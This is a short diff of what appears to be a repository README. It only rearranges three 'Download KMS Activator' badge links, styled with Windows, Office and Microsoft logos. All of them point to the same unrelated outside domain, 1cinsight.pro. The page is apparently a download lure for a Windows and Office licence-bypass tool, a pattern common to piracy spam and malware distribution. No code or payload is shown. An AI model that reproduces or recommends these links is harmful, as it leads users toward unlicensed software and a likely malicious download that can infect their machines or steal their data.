@@ -1,7 +1,5 @@
 
-[![Download KMS Activator](https://img.shields.io/badge/Download-KMS%20Activator-brightgreen?style=for-the-badge&logo=windows)](https://1cinsight.pro/)
-
-[![Download KMS Activator](https://img.shields.io/badge/Download-KMS%20Activator-2b2b2b?style=for-the-badge&logo=office)](https://1cinsight.pro/)
+[![Download KMS Activator](https://img.shields.io/badge/Download-KMS%20Activator-brightgreen?style=for-the-badge&logo=windows)](https://1cinsight.pro/) [![Download KMS Activator](https://img.shields.io/badge/Download-KMS%20Activator-2b2b2b?style=for-the-badge&logo=office)](https://1cinsight.pro/)
 
 [![Download KMS Activator](https://img.shields.io/badge/Download-KMS%20Activator-0078d7?style=for-the-badge&logo=microsoft)](https://1cinsight.pro/)
 
